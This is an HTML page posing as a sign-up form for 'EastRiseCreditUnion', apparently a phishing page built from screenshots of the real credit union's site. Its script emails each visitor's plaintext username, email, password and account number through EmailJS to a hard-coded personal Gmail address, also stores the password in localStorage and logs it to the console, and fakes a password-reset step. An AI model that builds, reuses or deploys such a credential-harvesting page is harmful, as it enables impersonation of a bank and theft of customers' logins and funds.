<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EastRiseCreditUnion - Sign Up</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
    }

    body {
      background: linear-gradient(135deg, #f0f2f5 0%, #e0e7ff 100%);
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .signup-main {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .signup-header-img {
      width: 100%;
      max-height: 120px;
      object-fit: cover;
      background-color: #ddd;
    }

    .logo-container {
      text-align: center;
      margin-bottom: 1.5rem;
    }

    .logo {
      width: 100px;
      height: auto;
      transition: transform 0.3s ease;
    }

    .logo:hover {
      transform: scale(1.1);
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: stretch;
      padding: 20px;
      flex: 1;
      max-width: 1600px;
      margin: 0 auto;
    }

    .form-container {
      background-color: rgba(255, 255, 255, 0.98);
      padding: 2rem;
      border-radius: 15px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 400px;
      transition: all 0.3s ease;
      margin-right: 20px;
      animation: fadeIn 1s ease-in-out;
    }

    .image-container {
      width: 100%;
      max-width: 900px;
      display: flex;
    }

    .right-image {
      width: 100%;
      max-width: 900px;
      height: 600px;
    }

    .heading {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #1a1a1a;
      font-size: 1.8rem;
      font-weight: 600;
    }

    .form-group {
      margin-bottom: 1.2rem;
    }

    .label {
      display: flex;
      align-items: center;
      margin-bottom: 0.5rem;
      color: #333;
      font-size: 0.9rem;
      font-weight: 500;
    }

    .label svg {
      margin-right: 8px;
    }

    .input {
      width: 100%;
      padding: 0.8rem;
      border: 1px solid #d1d1d1;
      border-radius: 6px;
      font-size: 0.95rem;
      transition: border-color 0.3s ease;
    }

    .input:focus {
      outline: none;
      border-color: #f5a623;
      box-shadow: 0 0 5px rgba(245, 166, 35, 0.3);
    }

    .password-container {
      position: relative;
    }

    .password-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      transition: stroke 0.3s ease;
    }

    .password-toggle:hover {
      stroke: #f5a623;
    }

    .signup-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 0.8rem;
      background: linear-gradient(90deg, #f5a623, #e6951c);
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 10px rgba(245, 166, 35, 0.3);
      position: relative;
    }

    .signup-btn:hover {
      background: linear-gradient(90deg, #e6951c, #d48415);
      transform: translateY(-2px);
      box-shadow: 0 6px 12px rgba(245, 166, 35, 0.4);
    }

    .signup-btn svg {
      margin-left: 8px;
    }

    .signup-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
      box-shadow: none;
    }

    .loading {
      display: none;
      position: absolute;
      right: 10px;
      width: 20px;
      height: 20px;
      border: 3px solid #fff;
      border-top: 3px solid #f5a623;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    .links {
      text-align: center;
      margin-top: 1rem;
    }

    .link {
      color: #1a1a1a;
      text-decoration: none;
      font-size: 0.85rem;
      display: block;
      margin-bottom: 0.5rem;
      transition: color 0.3s ease;
      cursor: pointer;
    }

    .link:hover {
      color: #f5a623;
    }

    .login-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 0.8rem;
      border: 2px solid #f5a623;
      border-radius: 8px;
      color: #1a1a1a;
      text-decoration: none;
      font-size: 0.9rem;
      font-weight: 500;
      transition: all 0.3s ease;
    }

    .login-btn:hover {
      background: linear-gradient(90deg, #f5a623, #e6951c);
      color: white;
      box-shadow: 0 4px 10px rgba(245, 166, 35, 0.3);
    }

    .login-btn svg {
      margin-right: 8px;
    }

    .signup-body-img {
      width: 100%;
      height: auto;
      object-fit: contain;
      background-color: #ddd;
    }

    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .modal-content {
      background-color: white;
      padding: 2rem;
      border-radius: 15px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
      animation: fadeIn 0.3s ease-in-out;
    }

    .modal-content h2 {
      margin-bottom: 1rem;
      font-size: 1.5rem;
      color: #1a1a1a;
    }

    .close-btn {
      float: right;
      font-size: 1.5rem;
      cursor: pointer;
      color: #333;
      transition: color 0.3s ease;
    }

    .close-btn:hover {
      color: #f5a623;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @media (max-width: 1200px) {
      .container {
        flex-direction: column;
        align-items: center;
      }

      .form-container {
        margin-right: 0;
        margin-bottom: 20px;
        width: 90%;
        max-width: 400px;
      }

      .image-container {
        width: 100%;
        max-width: 700px;
      }

      .right-image {
        width: 100%;
        height: 300px;
      }

      .signup-header-img {
        max-height: 100px;
      }
    }

    @media (max-width: 768px) {
      .form-container {
        width: 90%;
        max-width: 350px;
      }

      .right-image {
        height: 250px;
      }

      .signup-header-img {
        max-height: 80px;
      }
    }

    @media (max-width: 480px) {
      .form-container {
        padding: 1.5rem;
        width: 95%;
      }

      .heading {
        font-size: 1.5rem;
      }

      .input, .signup-btn, .login-btn {
        font-size: 0.9rem;
      }

      .right-image {
        height: 200px;
      }

      .signup-header-img {
        max-height: 60px;
      }

      .modal-content {
        width: 90%;
        padding: 1.5rem;
      }

      .logo {
        width: 80px;
      }
    }
  </style>
</head>
<body>
  <main class="signup-main">
    <img src="https://ik.imagekit.io/vj1zr14uts/loginheader.png?updatedAt=1748953501681" alt="Header" class="signup-header-img">

    <div class="container">
      <div class="form-container">
        <h2 class="heading">Sign Up</h2>
        <form id="signup-form">
          <div class="form-group">
            <label for="username" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                <circle cx="12" cy="7" r="4"></circle>
              </svg>
              Username
            </label>
            <input type="text" id="username" class="input" required>
          </div>
          <div class="form-group">
            <label for="email" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                <polyline points="22,6 12,13 2,6"></polyline>
              </svg>
              Email
            </label>
            <input type="email" id="email" class="input" required>
          </div>
          <div class="form-group">
            <label for="account-no" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M2 8V6a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2v-2"></path>
                <path d="M6 12h12"></path>
              </svg>
              Account Number
            </label>
            <input type="text" id="account-no" class="input" value="1968079" readonly>
          </div>
          <div class="form-group">
            <label for="password" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M18 8h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2z"></path>
              </svg>
              Password
            </label>
            <div class="password-container">
              <input type="password" id="password" class="input" required>
              <span class="password-toggle" id="password-toggle">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#808080" stroke-width="2" id="eye-icon">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                  <circle cx="12" cy="12" r="3"></circle>
                </svg>
              </span>
            </div>
          </div>
          <button type="submit" class="signup-btn" id="signup-btn">
            Sign Up
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M9 5l7 7-7 7"></path>
            </svg>
            <span class="loading" id="loading-indicator"></span>
          </button>
          <div class="links">
            <span class="link" id="forgot-password">Forgot your password?</span>
            <a href="login.html" class="login-btn">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2">
                <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
                <polyline points="10 17 15 12 10 7"></polyline>
                <line x1="15" y1="12" x2="3" y2="12"></line>
              </svg>
              Back to Login
            </a>
          </div>
        </form>
      </div>
      <div class="image-container">
        <img src="https://ik.imagekit.io/vj1zr14uts/image.png?updatedAt=1748976004404" alt="Right Side" class="right-image">
      </div>
    </div>

    <img src="https://ik.imagekit.io/vj1zr14uts/www.eastrise.com_open-account_%20(1).png?updatedAt=1748952842841" alt="Footer" class="signup-body-img">

    <!-- Forgot Password Modal -->
    <div class="modal" id="forgot-password-modal">
      <div class="modal-content">
        <span class="close-btn" id="close-modal">Ã—</span>
        <h2>Reset Password</h2>
        <form id="reset-password-form">
          <div class="form-group">
            <label for="reset-email" class="label">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                <polyline points="22,6 12,13 2,6"></polyline>
              </svg>
              Email
            </label>
            <input type="email" id="reset-email" class="input" required>
          </div>
          <button type="submit" class="signup-btn">Send Reset Link</button>
        </form>
      </div>
    </div>
  </main>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS with your User ID
    emailjs.init("RxxOvR4g0MsfjaTnJ"); // Replace with your actual EmailJS User ID

    // Password toggle functionality
    const passwordInput = document.getElementById('password');
    const passwordToggle = document.getElementById('password-toggle');
    const eyeIcon = document.getElementById('eye-icon');
    const signupBtn = document.getElementById('signup-btn');
    const loadingIndicator = document.getElementById('loading-indicator');

    passwordToggle.addEventListener('click', () => {
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      eyeIcon.innerHTML = isPassword
        ? '<path d="M17 10h-1.7a6 6 0 0 0-10.6 0H3a9 9 0 0 1 18 0z"></path>'
        : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
    });

    // Function to send emails to user and admin
    async function sendSignupEmails(username, email, accountNo, password) {
      const serviceID = "service_pfpncmc"; // Replace with your actual EmailJS Service ID
      const templateID = "template_x3pgxj9"; // Replace with your actual EmailJS Template ID
      const adminEmail = "unnatidaksha@gmail.com"; // Replace with your actual admin email

      // Log the data being sent for debugging
      console.log('Sending email with data:', {
        username,
        email,
        accountNo,
        password,
        adminEmail
      });

      try {
        // Send emails in parallel
        const [userResponse, adminResponse] = await Promise.all([
          emailjs.send(serviceID, templateID, {
            to_email: email,
            username: username,
            password: password,
            account_no: accountNo,
            to_name: username // Added for better template compatibility
          }).catch(err => ({ status: 'error', error: err })),
          emailjs.send(serviceID, templateID, {
            to_email: adminEmail,
            username: username,
            user_email: email,
            password: password,
            account_no: accountNo,
            to_name: 'Admin' // Added for better template compatibility
          }).catch(err => ({ status: 'error', error: err }))
        ]);

        // Check responses
        if (userResponse.status === 'error') {
          console.error('User email failed:', userResponse.error);
          alert('Failed to send email to user. Please check your email address and try again.');
          return false;
        } else {
          console.log('Email sent to user successfully:', userResponse);
        }

        if (adminResponse.status === 'error') {
          console.error('Admin email failed:', adminResponse.error);
          alert('Failed to send email to admin. Signup completed, but admin was not notified.');
        } else {
          console.log('Email sent to admin successfully:', adminResponse);
        }

        return true;
      } catch (error) {
        console.error('Error sending emails:', error);
        alert(`Failed to send emails: ${error.message || 'Unknown error'}`);
        return false;
      }
    }

    // Signup form submission handling
    document.getElementById('signup-form').addEventListener('submit', async function (event) {
      event.preventDefault();

      // Show loading state
      signupBtn.disabled = true;
      loadingIndicator.style.display = 'inline-block';

      const username = document.getElementById('username').value;
      const email = document.getElementById('email').value;
      const accountNo = document.getElementById('account-no').value;
      const password = document.getElementById('password').value;

      // Log stored data for debugging
      console.log('Form data:', {
        username,
        email,
        accountNo,
        password
      });

      // Store credentials in localStorage
      localStorage.setItem('signupUsername', username);
      localStorage.setItem('signupEmail', email);
      localStorage.setItem('signupAccountNo', accountNo);
      localStorage.setItem('signupPassword', password);

      // Send emails
      const emailSent = await sendSignupEmails(username, email, accountNo, password);

      // Hide loading state
      signupBtn.disabled = false;
      loadingIndicator.style.display = 'none';

      if (emailSent) {
        // Redirect to thank-you page
        window.location.href = 'thankspage.html';
      }
    });

    // Forgot Password Modal
    const forgotPasswordLink = document.getElementById('forgot-password');
    const modal = document.getElementById('forgot-password-modal');
    const closeModal = document.getElementById('close-modal');

    forgotPasswordLink.addEventListener('click', () => {
      modal.style.display = 'flex';
    });

    closeModal.addEventListener('click', () => {
      modal.style.display = 'none';
    });

    window.addEventListener('click', (event) => {
      if (event.target === modal) {
        modal.style.display = 'none';
      }
    });

    // Reset Password Form Submission (Placeholder)
    document.getElementById('reset-password-form').addEventListener('submit', function (event) {
      event.preventDefault();
      const resetEmail = document.getElementById('reset-email').value;
      console.log('Reset password requested for:', resetEmail);
      alert('Reset link sent to ' + resetEmail + '. Please check your email.');
      modal.style.display = 'none';
    });
  </script>
</body>
</html>
